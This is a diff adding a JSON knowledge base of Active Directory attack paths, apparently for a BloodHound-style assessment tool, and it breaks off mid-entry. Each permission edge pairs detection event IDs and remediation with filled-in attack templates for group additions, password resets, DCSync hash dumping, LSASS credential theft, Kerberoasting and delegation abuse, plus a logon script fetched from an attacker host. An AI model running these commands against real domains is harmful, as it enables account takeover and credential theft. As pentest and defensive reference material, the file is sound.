@@ -1,0 +1,738 @@
+{
+    "AddMember": {
+        "description": "Principal has the ability to add arbitrary principals to the target security group",
+        "abuse": "Use Add-DomainGroupMember in PowerView or net.exe to add members to the group",
+        "opsec": "Medium",
+        "remediation": "Review group membership regularly, implement least privilege access, use Privileged Access Management (PAM) solutions, enable approval workflows for sensitive group modifications",
+        "remediation_steps": [
+            "Audit current group membership and identify unauthorized members",
+            "Remove AddMember permissions from non-administrative principals",
+            "Implement approval workflows for sensitive group modifications",
+            "Enable monitoring for group membership changes (Event ID 4728)"
+        ],
+        "mitre_mapping": ["T1098"],
+        "detection_event_ids": [
+            {"id": "4728", "description": "Member added to security-enabled global group"},
+            {"id": "4732", "description": "Member added to security-enabled local group"},
+            {"id": "4756", "description": "Member added to security-enabled universal group"}
+        ],
+        "powershell_remediation": "Remove-ADGroupMember -Identity '{{TARGET}}' -Members '{{SOURCE}}' -Confirm:$false",
+        "command_templates": [
+            {
+                "title": "Add Member to Group",
+                "tool": "PowerView",
+                "command": "Add-DomainGroupMember -Identity '{{TARGET}}' -Members '{{SOURCE}}'",
+                "explanation": "Add {{SOURCE}} as a member of {{TARGET}} group to inherit its privileges"
+            },
+            {
+                "title": "Add Member via net.exe",
+                "tool": "net.exe",
+                "command": "net group \"{{TARGET}}\" {{SOURCE}} /add /domain",
+                "explanation": "Native Windows command to add {{SOURCE}} to {{TARGET}} group"
+            }
+        ],
+        "traversable": true
+    },
+    "AddSelf": {
+        "description": "Principal has the ability to add itself to the target security group",
+        "abuse": "Use Add-DomainGroupMember in PowerView or net.exe to add yourself to the group",
+        "opsec": "Medium",
+        "remediation": "Remove AddSelf permissions from security groups, implement approval workflows for group membership changes",
+        "remediation_steps": [
+            "Remove AddSelf ACE from the target group's DACL",
+            "Implement approval workflows for group membership changes",
+            "Monitor for self-additions to privileged groups"
+        ],
+        "mitre_mapping": ["T1098"],
+        "detection_event_ids": [
+            {"id": "4728", "description": "Member added to security-enabled global group"},
+            {"id": "4732", "description": "Member added to security-enabled local group"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.Access | Where-Object {$_.ActiveDirectoryRights -match 'Self'} | ForEach-Object {$acl.RemoveAccessRule($_)}; Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Add Self to Group",
+                "tool": "PowerView",
+                "command": "Add-DomainGroupMember -Identity '{{TARGET}}' -Members '{{SOURCE}}'",
+                "explanation": "Add yourself ({{SOURCE}}) to {{TARGET}} group using AddSelf permission"
+            }
+        ],
+        "traversable": true
+    },
+    "ForceChangePassword": {
+        "description": "Principal can reset the password of the target user without knowing current password",
+        "abuse": "Use Set-DomainUserPassword in PowerView or net.exe to reset password",
+        "opsec": "High",
+        "remediation": "Remove password reset rights from ACLs, implement approval workflow for password resets",
+        "remediation_steps": [
+            "Remove User-Force-Change-Password extended right from unauthorized principals",
+            "Implement help desk ticketing system for legitimate password resets",
+            "Enable monitoring for password reset events (Event ID 4724)"
+        ],
+        "mitre_mapping": ["T1098.001"],
+        "detection_event_ids": [
+            {"id": "4724", "description": "Password reset attempt by administrator"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.Access | Where-Object {$_.ObjectType -eq '00299570-246d-11d0-a768-00aa006e0529'} | ForEach-Object {$acl.RemoveAccessRule($_)}; Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Reset Password via PowerView",
+                "tool": "PowerView",
+                "command": "$cred = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force; Set-DomainUserPassword -Identity '{{TARGET}}' -AccountPassword $cred",
+                "explanation": "Reset {{TARGET}}'s password to a known value, gaining access to their account"
+            },
+            {
+                "title": "Reset Password via net.exe",
+                "tool": "net.exe",
+                "command": "net user {{TARGET}} 'P@ssw0rd123!' /domain",
+                "explanation": "Native Windows command to reset {{TARGET}}'s password"
+            }
+        ],
+        "traversable": true
+    },
+    "GenericAll": {
+        "description": "Full control over target object. Allows manipulation of the target object however they wish",
+        "abuse": "Varies by target: reset passwords, add members, modify GPOs, DCSync on domains, resource-based constrained delegation",
+        "opsec": "Medium",
+        "remediation": "Implement least privilege principle, regularly audit ACLs, restrict GenericAll to built-in admin groups only",
+        "remediation_steps": [
+            "Remove GenericAll permissions from non-administrative principals",
+            "Replace with specific minimum required permissions",
+            "Implement regular ACL auditing procedures",
+            "Use delegation wizard for granting specific rights"
+        ],
+        "mitre_mapping": ["T1098", "T1484.001"],
+        "detection_event_ids": [
+            {"id": "4670", "description": "Permissions changed on object"},
+            {"id": "4662", "description": "Operation performed on object"},
+            {"id": "5136", "description": "Directory service object modified"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.Access | Where-Object {$_.IdentityReference -match '{{SOURCE}}' -and $_.ActiveDirectoryRights -eq 'GenericAll'} | ForEach-Object {$acl.RemoveAccessRule($_)}; Set-Acl -AclObject $acl",
+        "command_templates_by_target": {
+            "User": [
+                {
+                    "title": "Reset Target Password",
+                    "tool": "PowerView",
+                    "command": "$cred = ConvertTo-SecureString 'P@ssw0rd123!' -AsPlainText -Force; Set-DomainUserPassword -Identity '{{TARGET}}' -AccountPassword $cred",
+                    "explanation": "Use GenericAll to reset {{TARGET}}'s password and take over the account"
+                },
+                {
+                    "title": "Targeted Kerberoasting",
+                    "tool": "PowerView",
+                    "command": "Set-DomainObject -Identity '{{TARGET}}' -Set @{serviceprincipalname='nonexistent/spn'}",
+                    "explanation": "Add a fake SPN to {{TARGET}} to make them Kerberoastable"
+                },
+                {
+                    "title": "Shadow Credentials Attack",
+                    "tool": "Whisker",
+                    "command": "Whisker.exe add /target:{{TARGET}} /domain:{{DOMAIN}} /dc:{{DC}}",
+                    "explanation": "Add shadow credentials to {{TARGET}} for certificate-based authentication"
+                }
+            ],
+            "Computer": [
+                {
+                    "title": "Resource-Based Constrained Delegation",
+                    "tool": "PowerView",
+                    "command": "Set-DomainObject -Identity '{{TARGET}}' -Set @{'msds-allowedtoactonbehalfofotheridentity'=$sd}",
+                    "explanation": "Configure RBCD on {{TARGET}} to allow impersonation"
+                },
+                {
+                    "title": "Shadow Credentials Attack",
+                    "tool": "Whisker",
+                    "command": "Whisker.exe add /target:{{TARGET}}$ /domain:{{DOMAIN}} /dc:{{DC}}",
+                    "explanation": "Add shadow credentials to {{TARGET}} computer for certificate-based authentication"
+                }
+            ],
+            "Group": [
+                {
+                    "title": "Add Member to Group",
+                    "tool": "PowerView",
+                    "command": "Add-DomainGroupMember -Identity '{{TARGET}}' -Members '{{ATTACKER}}'",
+                    "explanation": "Add yourself to {{TARGET}} group to inherit its privileges"
+                }
+            ],
+            "Domain": [
+                {
+                    "title": "Grant DCSync Rights",
+                    "tool": "PowerView",
+                    "command": "Add-DomainObjectAcl -TargetIdentity '{{DOMAIN_DN}}' -PrincipalIdentity '{{SOURCE}}' -Rights DCSync",
+                    "explanation": "Grant DCSync rights to {{SOURCE}} for domain credential extraction"
+                }
+            ]
+        },
+        "traversable": true
+    },
+    "GenericWrite": {
+        "description": "Generic Write access grants ability to write to any non-protected attribute on target object",
+        "abuse": "Write to msds-KeyCredentialLink for Shadow Credentials, servicePrincipalNames for kerberoasting, add members to groups",
+        "opsec": "Low-Medium",
+        "remediation": "Restrict write permissions to necessary attributes only, monitor sensitive attribute changes",
+        "remediation_steps": [
+            "Remove GenericWrite from unauthorized principals",
+            "Grant only specific attribute write permissions if needed",
+            "Monitor changes to msds-KeyCredentialLink and servicePrincipalName"
+        ],
+        "mitre_mapping": ["T1098", "T1558.003"],
+        "detection_event_ids": [
+            {"id": "5136", "description": "Directory object modified"},
+            {"id": "4738", "description": "User account changed"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.Access | Where-Object {$_.IdentityReference -match '{{SOURCE}}' -and $_.ActiveDirectoryRights -match 'GenericWrite'} | ForEach-Object {$acl.RemoveAccessRule($_)}; Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Shadow Credentials Attack",
+                "tool": "Whisker",
+                "command": "Whisker.exe add /target:{{TARGET}} /domain:{{DOMAIN}} /dc:{{DC}}",
+                "explanation": "Add shadow credentials to {{TARGET}} for certificate-based takeover"
+            },
+            {
+                "title": "Targeted Kerberoasting",
+                "tool": "PowerView",
+                "command": "Set-DomainObject -Identity '{{TARGET}}' -Set @{serviceprincipalname='fake/spn'}",
+                "explanation": "Add SPN to {{TARGET}} to enable Kerberoasting attack"
+            },
+            {
+                "title": "Logon Script Injection",
+                "tool": "PowerView",
+                "command": "Set-DomainObject -Identity '{{TARGET}}' -Set @{scriptpath='\\\\{{ATTACKER_IP}}\\share\\evil.ps1'}",
+                "explanation": "Set malicious logon script for {{TARGET}} to execute on next login"
+            }
+        ],
+        "traversable": true
+    },
+    "WriteDacl": {
+        "description": "Write access to target object's DACL, can grant any privilege",
+        "abuse": "Use Add-DomainObjectAcl to grant yourself desired privileges on the target",
+        "opsec": "Medium",
+        "remediation": "Restrict WriteDacl permissions, implement AdminSDHolder protection for privileged accounts",
+        "remediation_steps": [
+            "Remove WriteDacl from unauthorized principals",
+            "Implement AdminSDHolder for protecting privileged accounts",
+            "Enable SACL monitoring for DACL changes"
+        ],
+        "mitre_mapping": ["T1222.001"],
+        "detection_event_ids": [
+            {"id": "4670", "description": "Permissions changed on object"},
+            {"id": "4662", "description": "Operation on object with nTSecurityDescriptor"},
+            {"id": "5136", "description": "Directory service object modified"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.Access | Where-Object {$_.IdentityReference -match '{{SOURCE}}' -and $_.ActiveDirectoryRights -match 'WriteDacl'} | ForEach-Object {$acl.RemoveAccessRule($_)}; Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Grant GenericAll to Self",
+                "tool": "PowerView",
+                "command": "Add-DomainObjectAcl -TargetIdentity '{{TARGET}}' -PrincipalIdentity '{{SOURCE}}' -Rights All",
+                "explanation": "Modify DACL to grant {{SOURCE}} full control over {{TARGET}}"
+            },
+            {
+                "title": "Grant DCSync Rights",
+                "tool": "PowerView",
+                "command": "Add-DomainObjectAcl -TargetIdentity '{{DOMAIN_DN}}' -PrincipalIdentity '{{SOURCE}}' -Rights DCSync",
+                "explanation": "Grant DCSync replication rights for domain credential dumping"
+            },
+            {
+                "title": "Grant DCSync via Impacket",
+                "tool": "Impacket",
+                "command": "dacledit.py -action write -rights DCSync -principal '{{SOURCE}}' -target-dn '{{DOMAIN_DN}}' '{{DOMAIN}}/{{SOURCE}}:password'",
+                "explanation": "Grant DCSync rights using Impacket's dacledit"
+            }
+        ],
+        "traversable": true
+    },
+    "WriteOwner": {
+        "description": "Principal can change the owner of the target object, allowing indirect full control",
+        "abuse": "Change object owner to yourself, then as owner modify DACL to grant any desired permission",
+        "opsec": "Medium",
+        "remediation": "Restrict WriteOwner permissions on sensitive objects, implement AdminSDHolder for protected accounts",
+        "remediation_steps": [
+            "Remove WriteOwner from unauthorized principals",
+            "Implement AdminSDHolder protection for privileged accounts",
+            "Monitor ownership changes on sensitive objects"
+        ],
+        "mitre_mapping": ["T1222.001"],
+        "detection_event_ids": [
+            {"id": "4670", "description": "Permissions changed - owner modified"},
+            {"id": "4662", "description": "Operation performed on object"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.SetOwner([System.Security.Principal.NTAccount]'{{DOMAIN}}\\Domain Admins'); Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Change Object Owner",
+                "tool": "PowerView",
+                "command": "Set-DomainObjectOwner -Identity '{{TARGET}}' -OwnerIdentity '{{SOURCE}}'",
+                "explanation": "Take ownership of {{TARGET}} to gain full control over its security descriptor"
+            },
+            {
+                "title": "Grant Self Full Control",
+                "tool": "PowerView",
+                "command": "Add-DomainObjectAcl -TargetIdentity '{{TARGET}}' -PrincipalIdentity '{{SOURCE}}' -Rights All",
+                "explanation": "As owner, grant {{SOURCE}} full control over {{TARGET}}"
+            }
+        ],
+        "traversable": true
+    },
+    "Owns": {
+        "description": "Object ownership allows modifying security descriptors regardless of DACL",
+        "abuse": "Modify DACL to grant yourself desired privileges",
+        "opsec": "Medium",
+        "remediation": "Ensure critical objects owned by appropriate service accounts, monitor ownership changes",
+        "remediation_steps": [
+            "Change ownership to appropriate administrative account",
+            "Implement AdminSDHolder for protected objects",
+            "Monitor ownership modifications"
+        ],
+        "mitre_mapping": ["T1222.001"],
+        "detection_event_ids": [
+            {"id": "4670", "description": "Permissions changed"},
+            {"id": "4662", "description": "Operation performed on object"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.SetOwner([System.Security.Principal.NTAccount]'{{DOMAIN}}\\Domain Admins'); Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Grant Self Full Control",
+                "tool": "PowerView",
+                "command": "Add-DomainObjectAcl -TargetIdentity '{{TARGET}}' -PrincipalIdentity '{{SOURCE}}' -Rights All",
+                "explanation": "As owner, grant yourself full control over {{TARGET}}"
+            }
+        ],
+        "traversable": true
+    },
+    "DCSync": {
+        "description": "Combination of GetChanges and GetChangesAll privileges allowing replication of domain objects including password hashes",
+        "abuse": "Use mimikatz lsadump::dcsync or Impacket secretsdump to replicate password hashes from domain controller",
+        "opsec": "High",
+        "remediation": "Remove DS-Replication rights from non-DC principals, implement honey tokens, enable advanced auditing",
+        "remediation_steps": [
+            "Remove GetChanges and GetChangesAll rights from unauthorized principals",
+            "Audit all accounts with replication rights",
+            "Enable monitoring for Event ID 4662 with replication GUIDs",
+            "Deploy honey tokens to detect DCSync attacks"
+        ],
+        "mitre_mapping": ["T1003.006"],
+        "detection_event_ids": [
+            {"id": "4662", "description": "Directory replication access with GUIDs 1131f6aa/1131f6ad"},
+            {"id": "5136", "description": "Directory service replication"}
+        ],
+        "powershell_remediation": "Remove-ADPermission -Identity '{{DOMAIN_DN}}' -User '{{SOURCE}}' -ExtendedRights 'DS-Replication-Get-Changes', 'DS-Replication-Get-Changes-All'",
+        "command_templates": [
+            {
+                "title": "Extract krbtgt Hash",
+                "tool": "Mimikatz",
+                "command": "lsadump::dcsync /domain:{{DOMAIN}} /user:krbtgt",
+                "explanation": "Extract krbtgt hash for Golden Ticket creation - complete domain compromise"
+            },
+            {
+                "title": "Extract All Domain Hashes",
+                "tool": "Impacket",
+                "command": "secretsdump.py '{{DOMAIN}}/{{SOURCE}}:password'@{{DC}} -just-dc",
+                "explanation": "Dump all domain password hashes using DCSync"
+            },
+            {
+                "title": "Extract Specific User Hash",
+                "tool": "Mimikatz",
+                "command": "lsadump::dcsync /domain:{{DOMAIN}} /user:Administrator",
+                "explanation": "Extract Administrator hash for immediate domain admin access"
+            }
+        ],
+        "traversable": true
+    },
+    "AdminTo": {
+        "description": "Principal is a local administrator on the target computer",
+        "abuse": "Multiple methods: RDP, WMI, WinRM, PsExec, DCOM. Can perform credential theft, token impersonation",
+        "opsec": "Medium-High",
+        "remediation": "Implement LAPS for local admin passwords, restrict local admin rights, use JIT admin access",
+        "remediation_steps": [
+            "Remove unnecessary local administrator privileges",
+            "Deploy LAPS for unique local admin passwords",
+            "Implement tiered administration model",
+            "Use Just-In-Time (JIT) admin access"
+        ],
+        "mitre_mapping": ["T1078.003", "T1543.003", "T1021.002", "T1021.006"],
+        "detection_event_ids": [
+            {"id": "4672", "description": "Special privileges assigned"},
+            {"id": "4624", "description": "Logon - types 2, 3, 10"},
+            {"id": "4697", "description": "Service installed"}
+        ],
+        "powershell_remediation": "Invoke-Command -ComputerName '{{TARGET}}' -ScriptBlock { Remove-LocalGroupMember -Group 'Administrators' -Member '{{SOURCE}}' }",
+        "command_templates": [
+            {
+                "title": "Remote Shell via PsExec",
+                "tool": "Impacket",
+                "command": "psexec.py '{{DOMAIN}}/{{SOURCE}}:password'@{{TARGET}}",
+                "explanation": "Obtain SYSTEM shell on {{TARGET}} using local admin rights"
+            },
+            {
+                "title": "Remote Shell via WinRM",
+                "tool": "Evil-WinRM",
+                "command": "evil-winrm -i {{TARGET}} -u '{{SOURCE}}' -p 'password'",
+                "explanation": "Connect to {{TARGET}} via WinRM for interactive PowerShell"
+            },
+            {
+                "title": "Dump Credentials from Memory",
+                "tool": "Mimikatz",
+                "command": "sekurlsa::logonpasswords",
+                "explanation": "Extract credentials from LSASS memory on {{TARGET}}"
+            },
+            {
+                "title": "Remote Command Execution via WMI",
+                "tool": "Impacket",
+                "command": "wmiexec.py '{{DOMAIN}}/{{SOURCE}}:password'@{{TARGET}}",
+                "explanation": "Execute commands on {{TARGET}} via WMI"
+            }
+        ],
+        "traversable": true
+    },
+    "CanRDP": {
+        "description": "Remote Desktop access to target computer",
+        "abuse": "Use mstsc.exe, xfreerdp, or pass-the-hash with Restricted Admin Mode",
+        "opsec": "High",
+        "remediation": "Restrict RDP access via GPO, implement RDP Gateway with MFA, use Network Level Authentication",
+        "remediation_steps": [
+            "Remove unauthorized users from Remote Desktop Users group",
+            "Implement RDP Gateway with MFA",
+            "Enable Network Level Authentication (NLA)",
+            "Monitor RDP connections"
+        ],
+        "mitre_mapping": ["T1021.001"],
+        "detection_event_ids": [
+            {"id": "4624", "description": "Logon type 10 - RemoteInteractive"},
+            {"id": "4778", "description": "Session connected"},
+            {"id": "4779", "description": "Session disconnected"}
+        ],
+        "powershell_remediation": "Remove-LocalGroupMember -Group 'Remote Desktop Users' -Member '{{SOURCE}}'",
+        "command_templates": [
+            {
+                "title": "Connect via RDP",
+                "tool": "xfreerdp",
+                "command": "xfreerdp /u:'{{SOURCE}}' /p:'password' /v:{{TARGET}} /dynamic-resolution",
+                "explanation": "Establish RDP session to {{TARGET}} for interactive access"
+            },
+            {
+                "title": "RDP with Pass-the-Hash",
+                "tool": "xfreerdp",
+                "command": "xfreerdp /u:'{{SOURCE}}' /pth:'NTLM_HASH' /v:{{TARGET}} /restricted-admin",
+                "explanation": "RDP using NTLM hash with Restricted Admin Mode"
+            }
+        ],
+        "traversable": true
+    },
+    "CanPSRemote": {
+        "description": "PowerShell remoting access to target computer",
+        "abuse": "Use New-PSSession and Invoke-Command to execute commands remotely",
+        "opsec": "Medium",
+        "remediation": "Restrict WinRM access via GPO, implement JIT admin access, enable constrained language mode",
+        "remediation_steps": [
+            "Remove unauthorized users from Remote Management Users group",
+            "Implement Just-In-Time admin access",
+            "Enable PowerShell constrained language mode",
+            "Monitor WinRM connections"
+        ],
+        "mitre_mapping": ["T1021.006"],
+        "detection_event_ids": [
+            {"id": "4624", "description": "Logon type 3"},
+            {"id": "4648", "description": "Explicit credential logon"},
+            {"id": "4103", "description": "Module logging"},
+            {"id": "4104", "description": "Script block logging"}
+        ],
+        "powershell_remediation": "Remove-LocalGroupMember -Group 'Remote Management Users' -Member '{{SOURCE}}'",
+        "command_templates": [
+            {
+                "title": "Interactive PowerShell Session",
+                "tool": "PowerShell",
+                "command": "Enter-PSSession -ComputerName {{TARGET}} -Credential (Get-Credential)",
+                "explanation": "Establish interactive PowerShell session to {{TARGET}}"
+            },
+            {
+                "title": "Remote Command Execution",
+                "tool": "PowerShell",
+                "command": "Invoke-Command -ComputerName {{TARGET}} -ScriptBlock { whoami; hostname }",
+                "explanation": "Execute commands remotely on {{TARGET}}"
+            },
+            {
+                "title": "WinRM via Evil-WinRM",
+                "tool": "Evil-WinRM",
+                "command": "evil-winrm -i {{TARGET}} -u '{{SOURCE}}' -p 'password'",
+                "explanation": "Connect via WinRM for penetration testing"
+            }
+        ],
+        "traversable": true
+    },
+    "HasSession": {
+        "description": "User has an active session on the target computer, making credentials potentially available in memory",
+        "abuse": "If attacker has admin access to computer, use mimikatz to harvest user's credentials from memory",
+        "opsec": "High",
+        "remediation": "Implement Credential Guard, enable Protected Process Light for LSASS, restrict interactive logons for privileged accounts",
+        "remediation_steps": [
+            "Enable Credential Guard on sensitive systems",
+            "Implement Protected Process Light for LSASS",
+            "Restrict interactive logons for privileged accounts",
+            "Use Privileged Access Workstations (PAWs)"
+        ],
+        "mitre_mapping": ["T1003.001", "T1134"],
+        "detection_event_ids": [
+            {"id": "10", "description": "Sysmon - Process access to lsass.exe"},
+            {"id": "4688", "description": "Process creation - procdump/mimikatz"}
+        ],
+        "powershell_remediation": "# Enable Credential Guard via GPO; Enable LSASS PPL: Set-ItemProperty -Path 'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\Lsa' -Name 'RunAsPPL' -Value 1",
+        "command_templates": [
+            {
+                "title": "Dump Credentials from Memory",
+                "tool": "Mimikatz",
+                "command": "sekurlsa::logonpasswords",
+                "explanation": "Extract {{TARGET}}'s credentials from LSASS memory if they have active session"
+            },
+            {
+                "title": "Token Impersonation",
+                "tool": "Incognito",
+                "command": "incognito.exe list_tokens -u; incognito.exe execute -c '{{DOMAIN}}\\{{TARGET}}' cmd.exe",
+                "explanation": "Impersonate {{TARGET}}'s token from their active session"
+            }
+        ],
+        "traversable": true
+    },
+    "ReadLAPSPassword": {
+        "description": "Privilege to read LAPS password from computer object",
+        "abuse": "Read ms-Mcs-AdmPwd attribute via LDAP to obtain local administrator password",
+        "opsec": "Low",
+        "remediation": "Restrict LAPS password read permissions to authorized IT staff only, implement JIT admin access",
+        "remediation_steps": [
+            "Audit who has LAPS read permissions",
+            "Restrict to authorized administrators only",
+            "Implement JIT access for LAPS passwords",
+            "Enable auditing on LAPS attributes"
+        ],
+        "mitre_mapping": ["T1003.008"],
+        "detection_event_ids": [
+            {"id": "4662", "description": "Operation on object with ms-Mcs-AdmPwd property"}
+        ],
+        "powershell_remediation": "Set-AdmPwdReadPasswordPermission -Identity 'OU=Computers,DC=domain,DC=com' -AllowedPrincipals '{{DOMAIN}}\\AuthorizedGroup'",
+        "command_templates": [
+            {
+                "title": "Read LAPS Password",
+                "tool": "PowerView",
+                "command": "Get-DomainComputer -Identity '{{TARGET}}' -Properties ms-mcs-admpwd | Select-Object name, ms-mcs-admpwd",
+                "explanation": "Retrieve LAPS password for {{TARGET}} computer"
+            },
+            {
+                "title": "Read LAPS via CrackMapExec",
+                "tool": "CrackMapExec",
+                "command": "crackmapexec ldap {{DC}} -u '{{SOURCE}}' -p 'password' --laps --computer {{TARGET}}",
+                "explanation": "Dump LAPS password for {{TARGET}} using CrackMapExec"
+            },
+            {
+                "title": "Authenticate with LAPS Password",
+                "tool": "Impacket",
+                "command": "psexec.py './Administrator:LAPS_PASSWORD'@{{TARGET}}",
+                "explanation": "Use retrieved LAPS password to gain SYSTEM access on {{TARGET}}"
+            }
+        ],
+        "traversable": true
+    },
+    "AllowedToDelegate": {
+        "description": "Constrained delegation allows principal to authenticate as any user to specific services on target",
+        "abuse": "Use Rubeus s4u command to impersonate users to delegated services",
+        "opsec": "Low-Medium",
+        "remediation": "Use resource-based constrained delegation instead, disable unconstrained delegation, protect sensitive accounts",
+        "remediation_steps": [
+            "Review and minimize delegation configurations",
+            "Use RBCD instead of constrained delegation where possible",
+            "Mark sensitive accounts as 'Account is sensitive and cannot be delegated'",
+            "Migrate to gMSA for service accounts"
+        ],
+        "mitre_mapping": ["T1187"],
+        "detection_event_ids": [
+            {"id": "4769", "description": "Kerberos service ticket with delegation flags"},
+            {"id": "4768", "description": "Kerberos TGT request"}
+        ],
+        "powershell_remediation": "Set-ADAccountControl -Identity '{{SOURCE}}' -TrustedForDelegation $false; Set-ADComputer -Identity '{{SOURCE}}' -Clear 'msDS-AllowedToDelegateTo'",
+        "command_templates": [
+            {
+                "title": "S4U2Self/S4U2Proxy Attack",
+                "tool": "Rubeus",
+                "command": "Rubeus.exe s4u /user:{{SOURCE}} /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/{{TARGET}} /ptt",
+                "explanation": "Request ticket as Administrator to access {{TARGET}} via delegation"
+            },
+            {
+                "title": "Delegation Attack via Impacket",
+                "tool": "Impacket",
+                "command": "getST.py -spn cifs/{{TARGET}} -impersonate Administrator '{{DOMAIN}}/{{SOURCE}}:password'",
+                "explanation": "Request service ticket impersonating Administrator to {{TARGET}}"
+            }
+        ],
+        "traversable": true
+    },
+    "AllowedToAct": {
+        "description": "Resource-based constrained delegation - principal can impersonate users to services on target computer",
+        "abuse": "Use Rubeus to request service tickets as any domain user to services on target",
+        "opsec": "Low-Medium",
+        "remediation": "Monitor msDS-AllowedToActOnBehalfOfOtherIdentity, use constrained delegation instead when possible",
+        "remediation_steps": [
+            "Review msDS-AllowedToActOnBehalfOfOtherIdentity configurations",
+            "Remove unauthorized RBCD configurations",
+            "Monitor for RBCD attribute changes"
+        ],
+        "mitre_mapping": ["T1187"],
+        "detection_event_ids": [
+            {"id": "4769", "description": "Kerberos service ticket with S4U2Proxy"},
+            {"id": "5136", "description": "msDS-AllowedToActOnBehalfOfOtherIdentity modified"}
+        ],
+        "powershell_remediation": "Set-ADComputer -Identity '{{TARGET}}' -PrincipalsAllowedToDelegateToAccount $null",
+        "command_templates": [
+            {
+                "title": "RBCD Attack",
+                "tool": "Rubeus",
+                "command": "Rubeus.exe s4u /user:{{SOURCE}}$ /rc4:NTLM_HASH /impersonateuser:Administrator /msdsspn:cifs/{{TARGET}} /ptt",
+                "explanation": "Impersonate Administrator to access {{TARGET}} via RBCD"
+            },
+            {
+                "title": "RBCD via Impacket",
+                "tool": "Impacket",
+                "command": "getST.py -spn cifs/{{TARGET}} -impersonate Administrator -dc-ip {{DC_IP}} '{{DOMAIN}}/{{SOURCE}}$:password'",
+                "explanation": "Request impersonated service ticket to {{TARGET}}"
+            }
+        ],
+        "traversable": true
+    },
+    "MemberOf": {
+        "description": "Principal is a member of the target security group, inherits all permissions and group memberships",
+        "abuse": "Membership grants all rights and permissions of the group - this is the privilege, not the attack",
+        "opsec": "N/A",
+        "remediation": "Regularly review group memberships, implement least privilege, use PAM for temporary group membership",
+        "remediation_steps": [
+            "Audit privileged group memberships regularly",
+            "Remove unnecessary memberships",
+            "Implement time-based group membership via PAM",
+            "Enable monitoring for group membership changes"
+        ],
+        "mitre_mapping": ["T1078.002"],
+        "detection_event_ids": [
+            {"id": "4728", "description": "Member added to security group"},
+            {"id": "4729", "description": "Member removed from security group"}
+        ],
+        "powershell_remediation": "Remove-ADGroupMember -Identity '{{TARGET}}' -Members '{{SOURCE}}' -Confirm:$false",
+        "command_templates": [
+            {
+                "title": "Verify Group Membership",
+                "tool": "PowerView",
+                "command": "Get-DomainGroupMember -Identity '{{TARGET}}' -Recurse | Where-Object { $_.MemberName -match '{{SOURCE}}' }",
+                "explanation": "Confirm {{SOURCE}} is member of {{TARGET}} group"
+            }
+        ],
+        "traversable": true
+    },
+    "HasSPNConfigured": {
+        "description": "Service account has Service Principal Name configured, making it vulnerable to Kerberoasting",
+        "abuse": "Request TGS ticket for the SPN and crack the password offline using hashcat or John",
+        "opsec": "Low",
+        "remediation": "Use gMSA for service accounts, enforce strong passwords (25+ chars), enable AES encryption",
+        "remediation_steps": [
+            "Migrate service accounts to Group Managed Service Accounts (gMSA)",
+            "Enforce strong passwords (25+ characters) for remaining SPNs",
+            "Enable AES-only Kerberos encryption",
+            "Remove unnecessary SPNs"
+        ],
+        "mitre_mapping": ["T1558.003"],
+        "detection_event_ids": [
+            {"id": "4769", "description": "Kerberos service ticket request - especially with RC4 (0x17)"}
+        ],
+        "powershell_remediation": "# Migrate to gMSA or set strong password; Remove-ADServiceAccount or set 25+ char password",
+        "command_templates": [
+            {
+                "title": "Request Kerberoastable Hashes",
+                "tool": "Rubeus",
+                "command": "Rubeus.exe kerberoast /user:{{TARGET}} /outfile:hashes.txt",
+                "explanation": "Request TGS ticket for {{TARGET}}'s SPN for offline cracking"
+            },
+            {
+                "title": "Kerberoast via Impacket",
+                "tool": "Impacket",
+                "command": "GetUserSPNs.py '{{DOMAIN}}/{{SOURCE}}:password' -request -outputfile hashes.txt",
+                "explanation": "Request service tickets for all Kerberoastable accounts"
+            },
+            {
+                "title": "Crack the Hash",
+                "tool": "hashcat",
+                "command": "hashcat -m 13100 hashes.txt wordlist.txt -r rules/best64.rule",
+                "explanation": "Crack the Kerberos TGS hash to recover {{TARGET}}'s password"
+            }
+        ],
+        "traversable": true
+    },
+    "AddKeyCredentialLink": {
+        "description": "Principal can write to msDS-KeyCredentialLink attribute, enabling Shadow Credentials attack",
+        "abuse": "Add key credentials to target, generate certificate, authenticate without knowing password",
+        "opsec": "Low-Medium",
+        "remediation": "Restrict write access to msDS-KeyCredentialLink, monitor attribute additions, disable PKINIT if not required",
+        "remediation_steps": [
+            "Remove write permissions to msDS-KeyCredentialLink",
+            "Monitor additions to this attribute",
+            "Consider disabling PKINIT if not used",
+            "Implement certificate transparency"
+        ],
+        "mitre_mapping": ["T1098.001"],
+        "detection_event_ids": [
+            {"id": "5136", "description": "msDS-KeyCredentialLink attribute modified"},
+            {"id": "4768", "description": "Kerberos TGT with PKINIT pre-authentication"}
+        ],
+        "powershell_remediation": "$acl = Get-Acl 'AD:\\{{TARGET_DN}}'; $acl.Access | Where-Object {$_.ObjectType -eq '5b47d60f-6090-40b2-9f37-2a4de88f3063'} | ForEach-Object {$acl.RemoveAccessRule($_)}; Set-Acl -AclObject $acl",
+        "command_templates": [
+            {
+                "title": "Shadow Credentials Attack",
+                "tool": "Whisker",
+                "command": "Whisker.exe add /target:{{TARGET}} /domain:{{DOMAIN}} /dc:{{DC}}",
+                "explanation": "Add shadow credentials to {{TARGET}} for certificate-based takeover"
+            },
+            {
+                "title": "Shadow Credentials via pyWhisker",
+                "tool": "pyWhisker",
